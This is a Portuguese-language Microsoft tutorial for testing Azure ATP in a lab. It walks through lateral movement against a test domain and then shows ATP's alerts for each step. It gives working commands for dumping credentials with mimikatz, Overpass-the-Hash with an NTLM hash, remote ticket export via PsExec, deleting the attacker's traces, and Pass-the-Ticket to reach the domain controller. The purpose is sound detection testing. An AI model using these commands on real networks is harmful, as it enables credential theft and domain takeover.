---
title: Guia Estratégico de Movimentação Lateral de Alerta de Segurança do ATP do Azure | Microsoft Docs
description: O guia estratégico do ATP do Azure descreve como simular ameaças de Movimentação Lateral para detecção do ATP do Azure.
ms.service: azure-advanced-threat-protection
ms.topic: tutorial
author: mlottner
ms.author: mlottner
ms.date: 03/03/2019
ms.reviewer: itargoet
ms.openlocfilehash: d7243b74c14a1782b8902473cc6f098d0e12832f
ms.sourcegitcommit: 6dd002b5a34f230aaada55a6f6178c2f9e1584d9
ms.translationtype: HT
ms.contentlocale: pt-BR
ms.lasthandoff: 12/05/2019
ms.locfileid: "57318046"
---
# <a name="tutorial-lateral-movement-playbook"></a>Tutorial: Guia estratégico de movimentação lateral

O guia estratégico de movimentação lateral é a terceira parte da série de quatro tutoriais para alertas de segurança do ATP do Azure. A finalidade do laboratório de alerta de segurança do ATP do Azure é ilustrar os recursos do **ATP do Azure** para identificação e detecção de atividades suspeitas e possíveis ataques contra a sua rede. O guia estratégico explica como testar algumas das detecções *discretas* do ATP do Azure. O guia estratégico concentra-se nos recursos baseados em *assinatura* do ATP do Azure e não inclui o aprendizado de máquina avançado, detecções comportamentais baseadas no usuário ou na entidade (isso exige um período de aprendizado com o tráfego de rede real de até 30 dias). Para saber mais sobre cada tutorial desta série, consulte a [Visão geral do laboratório de alerta de segurança do ATP](atp-playbook-lab-overview.md).

Este guia estratégico mostra alguns dos serviços de detecções de ameaça e alertas de segurança de movimentação lateral do ATP do Azure simulando um ataque comum com ferramentas de ataque e invasão comuns e reais disponíveis publicamente.

Neste tutorial, você vai:
> [!div class="checklist"]
> * Coletar hashes de NTLM e simular um ataque de Overpass-the-Hash para obter um TGT (tíquete de concessão de tíquete) do Kerberos.
> * Mascarar-se como outro usuário, movimentar-se lateralmente pela rede e coletar mais credenciais.
> * Simular um ataque Pass-the-Ticket para ter acesso ao controlador de domínio.
> * Examinar os alertas de segurança da movimentação lateral no ATP do Azure.

## <a name="prerequisites"></a>Pré-requisitos

1. [Um laboratório de alerta de segurança completo do ATP](atp-playbook-setup-lab.md) 
     - Recomendamos seguir as instruções de configuração do laboratório com a maior fidelidade possível. Quanto mais parecido estiver o seu laboratório com a configuração de laboratório sugerida, mais fácil será para seguir os procedimentos de teste do ATP do Azure.

2. [Conclusão do tutorial Guia estratégico de reconhecimento](atp-playbook-reconnaissance.md)

## <a name="lateral-movement"></a>Movimentação lateral

Conseguimos, com nossos ataques simulados no tutorial anterior, Guia estratégico de reconhecimento, muitas informações sobre a rede. Usando essas informações, nossa meta durante essa fase de Movimentação Lateral do laboratório é chegar aos endereços IP de valor crítico que já descobrimos e ver os alertas do ATP do Azure sobre a movimentação. Na simulação do laboratório de Reconhecimento anterior, identificamos 10.0.24.6 como o IP de destino, pois era nesse local que as credenciais do computador de YasminC foram expostas. Simularemos vários métodos de ataque para tentar se movimentar lateralmente no domínio.

## <a name="dump-credentials-in-memory-from-victimpc"></a>Despejo de credenciais na memória de VictimPC

Durante nossas simulações de ataques de reconhecimento, **VictimPC** não foi exposta somente às credenciais do DiogoM. Há outras contas úteis para descobrir nesse computador. Para conseguir uma movimentação lateral usando **VictimPC**, tentaremos enumerar as credenciais na memória no recurso compartilhado. Despejar credenciais na memória usando **mimikatz** é um método de ataque popular que usa uma ferramenta comum.

### <a name="mimikatz-sekurlsalogonpasswords"></a>Mimikatz sekurlsa::logonpasswords

1. Abra um **prompt de comandos com privilégios elevados** no **VictimPC**. 
2. Navegue até a pasta de ferramentas onde você salvou Mimikatz e execute o seguinte comando:

   ``` cmd
   mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" >> c:\temp\victimcpc.txt
   ```

3. Abra **c:\\temp\\victimpc.txt** para exibir as credenciais coletadas que Mimikatz encontrou e gravou no arquivo txt.
   ![Saída de Mimikatz incluindo o hash NTLM do EduardoHD](media/playbook-lateral-sekurlsa-logonpasswords-output.png)

4. Coletamos com êxito o hash NTLM do EduardoHD da memória usando mimikatz. Precisaremos do hash NTLM em breve.

   > [!Important]
   > - É esperado e normal que os hashes mostrados neste exemplo sejam diferentes dos hashes em seu próprio ambiente de laboratório. O objetivo deste exercício é ajudar você a entender como os hashes foram obtidos, obter os valores deles e usá-los nas próximas fases. </br> </br>
   > - A credencial da conta do computador também foi exposta nessa coleta. Embora o valor de credencial da conta de computador não seja útil em nosso laboratório atual, lembre-se de que essa é outra via real usada por invasores para conseguir movimentação lateral em seu ambiente.

### <a name="gather-more-information-about-the-ronhd-account"></a>Coletar mais informações sobre a conta do EduardoHD

Talvez um invasor não saiba inicialmente quem é EduardoHD ou seu valor como destino. Tudo o que ele sabe é que pode usar a credencial, se isso for vantajoso. No entanto, usando o comando **net** nós, agindo como invasor, podemos descobrir de quais grupos EduardoHD é membro.

No **VictimPC**, execute o seguinte comando:

   ``` cmd
   net user ronhd /domain
   ```

![Reconhecimento na conta do EduardoHD](media/playbook-lateral-sekurlsa-logonpasswords-ronhd_discovery.png)

Nos resultados, aprendemos que EduardoHD é membro do Grupo de Segurança "Helpdesk". Nós sabemos que EduardoHD nos dá direitos que acompanham a conta *e* o Grupo de Segurança Helpdesk.

### <a name="mimikatz-sekurlsapth"></a>Mimikatz sekurlsa::pth

Usando uma técnica comum chamada **Overpass-the-Hash**, o hash NTLM coletado é usado para obter um TGT (tíquete de concessão de tíquete). Um invasor com o TGT de um usuário pode se disfarçar de usuário comprometido, como EduardoHD. Ao se disfarçar de EduardoHD, podemos acessar qualquer recurso do domínio ao qual o usuário comprometido tem acesso, ou ao qual seus respectivos Grupos de Segurança têm acesso.

1. Em **VictimPC**, altere o diretório para a pasta que contém **Mimikatz.exe**. no sistema de arquivos e execute o seguinte comando:

   ``` cmd
   mimikatz.exe "privilege::debug" "sekurlsa::pth /user:ronhd /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:contoso.azure" "exit"
   ```

   > [!Note]
   > Se o hash para EduardoHD era diferente nas etapas anteriores, substitua o hash NTLM acima pelo hash obtido em *victimpc.txt*.

   ![Overpass-the-hash via mimikatz](media/playbook-lateral-opth1.png)

2. Verifique se um novo prompt de comando é aberto. Ele estará executando como EduardoHD, mas talvez isso *ainda* não seja óbvio. Não feche o novo prompt de comando, você o usará em seguida.

O ATP do Azure não detecta um hash passado em um recurso local. O ATP do Azure detecta quando um hash é **usado de um recurso para acessar outro** recurso ou serviço.

### <a name="additional-lateral-move"></a>Movimentação lateral adicional

Agora, com a credencial do EduardoHD, podemos obter acesso que não tínhamos com as credenciais do DiogoM?
Usaremos o **PowerSploit** ```Get-NetLocalGroup``` para ajudar a responder a isso.

1. No console de comando aberto devido ao nosso ataque anterior, executando como EduardoHD, execute os seguintes itens:

   ``` PowerShell
   powershell
   Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
   Import-Module C:\tools\PowerSploit\PowerSploit.psm1 -Force
   Get-NetLocalGroup 10.0.24.6
   ```

   ![Obter os administradores locais para 10.0.24.6 via PowerSploit](media/playbook-lateral-adminpcsamr.png)

   Nos bastidores, isso usa SAM remoto para identificar os administradores locais do IP que descobrimos anteriormente e que foi exposto a uma conta de Administrador de Domínio.

   Nossa saída será semelhante a:

   ![Saída do PowerSploit Get-NetLocalGroup](media/playbook-lateral-adminpcsamr_results.png)

   Este computador tem dois Administradores Locais, o Administrador interno "ContosoAdmin" e "Helpdesk". Sabemos que EduardoHD é membro do Grupo de Segurança "Helpdesk". Também ficamos sabendo do nome do computador, AdminPC. Já que temos as credenciais do EduardoHD, podemos usá-las para nos movimentarmos lateralmente até AdminPC e obter acesso a esse computador.

2. Do *mesmo prompt de comando, que está em execução no contexto do EduardoHD*, digite **exit** para sair do PowerShell, se for necessário. Em seguida, execute este comando:

   ``` cmd
   dir \\adminpc\c$
   ```

3. Conseguimos acessar AdminPC. Vamos ver quais tíquetes nós temos. No mesmo prompt de comando, execute o seguinte comando:

   ``` cmd
   klist
   ```

   ![Usar klist para nos mostrar os tíquetes Kerberos em nosso processo cmd.exe atual](media/playbook-lateral-klist.png)

Você pode ver que, para esse processo específico, temos o TGT do EduardoHD na memória. Executamos um ataque de Overpass-the-Hash em nosso laboratório. Convertemos o hash NTLM que foi comprometido anteriormente e o utilizamos para obter um TGT de Kerberos. Esse TGT de Kerberos foi usado para obter acesso a outro recurso de rede, neste caso, AdminPC. 

### <a name="overpass-the-hash-detected-in-azure-atp"></a>Overpass-the-Hash detectado no ATP do Azure

Analisando o console do ATP do Azure, podemos ver o seguinte:

![AATP detectando o ataque Overpass-the-Hash](media/playbook-lateral-opthdetection.png)

O ATP do Azure detectou que conta do EduardoHD foi comprometida no VictimPC e, em seguida, usada para obter um TGT de Kerberos. Se clicarmos no nome do EduardoHD no alerta, seremos levados à linha do tempo de Atividade Lógica do EduardoHD, onde podemos investigar mais.

![Exibir a detecção na linha do tempo de Atividade Lógica](media/playbook-lateral-opthlogicalactivity.png)

No Centro de Operações de Segurança, nosso analista de segurança é avisado sobre a credencial comprometida e pode investigar rapidamente quais recursos ela acessou.

## <a name="domain-escalation"></a>Escalonamento de domínio

A partir de nosso ataque simulado, não temos apenas acesso ao AdminPC, nós validamos os privilégios de Administrador no AdminPC. Agora, podemos nos movimentar lateralmente até AdminPC e coletar mais credenciais.

Aqui, iremos:

* Preparar Mimikatz no AdminPC
* Coletar Tíquetes no AdminPC
* Pass-the-Ticket para nos tornamos YasminC

### <a name="pass-the-ticket"></a>Pass-the-Ticket

No prompt de comando em execução no contexto de *EduardoHD* no **VictimPC**, vá até onde estão nossas ferramentas comuns de ataque. Em seguida, execute xcopy para mover essas ferramentas para o AdminPC:

``` cmd
xcopy mimikatz.exe \\adminpc\c$\temp
```

Pressione ```d``` quando solicitado, informando que a pasta "temp" é um diretório no AdminPC.

![Copiar arquivos para o AdminPC](media/playbook-escalation-xcopy1.png)

### <a name="mimikatz-sekurlsatickets"></a>Mimikatz sekurlsa::tickets

Com Mimikatz preparado em AdminPC, usaremos PsExec para executá-lo remotamente.

1. Vá até onde o PsExec está localizado e execute o seguinte comando:

   ``` cmd
   PsExec.exe \\AdminPC -accepteula cmd /c (cd c:\temp ^& mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit")
   ```

   Esse comando executará e exportará os tíquetes encontrado no processo LSASS.exe e coloque-os no diretório atual, em AdminPC.

2. Precisamos copiar os tíquetes de volta ao VictimPC de AdminPC. Já que estamos interessados apenas nos tíquetes de YasminC para este exemplo, execute o seguinte comando:

   ``` cmd
   xcopy \\adminpc\c$\temp\*SamiraA* c:\temp\adminpc_tickets
   ```

   ![Exportar credenciais coletadas de AdminPC de volta para VictimPC](media/playbook-escalation-export_tickets2.png)

3. Vamos limpar nossos rastros no AdminPC excluindo nossos arquivos.

   ``` cmd
   rmdir \\adminpc\c$\temp /s /q
   ```

   > [!Note]
   > Os invasores mais sofisticados não tocarão no disco durante a execução do código aleatório em um computador após a obtenção de privilégios administrativos nele.

   Em nosso **VictimPC**, temos esses tíquetes coletados em nossa pasta **c:\temp\adminpc_tickets**:

   ![C:\temp\tickets é a nossa saída exportada de mimikatz de AdminPC](media/playbook-escalation-export_tickets4.png)


### <a name="mimikatz-kerberosptt"></a>Mimikatz Kerberos::ptt

Com os tíquetes localmente no VictimPC, finalmente chegou a hora de se tornar YasminC "Passando o tíquete".

1. No local de **Mimikatz** no sistema de arquivos **VictimPC**, abra um novo **prompt de comando com privilégios elevados** e execute o seguinte comando:

   ``` cmd
   mimikatz.exe "privilege::debug" "kerberos::ptt c:\temp\adminpc_tickets" "exit"
   ```

   ![Importar os tíquetes roubados no processo de cmd.exe](media/playbook-escalation-ptt1.png)

2. No mesmo prompt de comandos com privilégios elevados, valide se as os tíquetes certos estão na sessão do prompt de comando. Execute o seguinte comando:

   ``` cmd
   klist
   ```

   ![Executar klist para ver os tíquetes importados no processo de CMD](media/playbook-escalation-ptt2.png)

3. Observe que esses tíquetes permanecem inutilizados. Atuando como invasor, "passamos o tíquete" com sucesso. Coletamos a credencial de YasmiC de AdminPC e, em seguida, as passamos para outro processo em execução no VictimPC.

   > [!Note]
   > Como no Pass-the-Hash, o ATP do Azure não sabe que o tíquete foi passado com base na atividade do cliente local. No entanto, o ATP do Azure detecta a atividade *após o uso do tíquete*, ou seja, utilizado para acessar outro recurso/serviço.

4. Conclua seu ataque simulado acessando o controlador de domínio em **VictimPC**. No prompt de comando, agora em execução com os tíquetes de YasmiC na memória, execute:

   ``` cmd
   dir \\ContosoDC\c$
   ```

   ![Acessar a unidade c:\ de ContosoDC usando as credenciais de YasmiC](media/playbook-escalation-ptt3.png)

Sucesso! Por meio de nosso ataques fictícios, conseguimos acesso de administrador em nosso controlador de domínio e conseguimos comprometer a Floresta/Domínio do Active Directory do nosso laboratório.

### <a name="pass-the-ticket-detection-in-azure-atp"></a>Detecção de passagem de tíquete no ATP do Azure

A maioria das ferramentas de segurança não conseguem detectar quando uma credencial legítima foi usada para acessar um recurso legítimo. Em contraste, o que faz o ATP do Azure detectar e alertar sobre essa cadeia de eventos?

- O ATP do Azure detectou o roubo dos tíquetes de Yasmin de AdminPC e a movimentação para VictimPC.
- O portal do ATP do Azure mostra exatamente quais recursos foram acessados usando os tíquetes roubados.
- Fornece informações importantes e evidências que identificam exatamente onde começar a investigação e quais etapas de correção executar.

As detecções do ATP do Azure e as informações de alerta são fundamentais para qualquer equipe de DFIR (Resposta a incidentes de análise forense digital). Além de poder ver as credenciais que estão sendo roubadas, também aprende quais recursos foram acessados e comprometidos pelo tíquete roubado.

![O ATP do Azure detecta Pass-the-Ticket com supressão de duas horas](media/playbook-escalation-pttdetection.png)

> [!NOTE]
> Esse evento só será exibido no console do ATP do Azure em **duas horas**. Eventos desse tipo são suprimidos propositadamente para esse período a fim de reduzir falsos positivos.

## <a name="next-steps"></a>Próximas etapas
A próxima fase na cadeia de encerramento do ataque é a predominância de domínio.

> [!div class="nextstepaction"]
> [Guia estratégico de predominância de domínio do ATP do Azure](atp-playbook-domain-dominance.md)

## <a name="join-the-community"></a>Participe da comunidade

Tem mais perguntas ou interesse em discutir sobre o ATP do Azure e a segurança relacionada com outras pessoas? Participe da [Comunidade do ATP do Azure](https://techcommunity.microsoft.com/t5/Azure-Advanced-Threat-Protection/bd-p/AzureAdvancedThreatProtection) hoje mesmo!
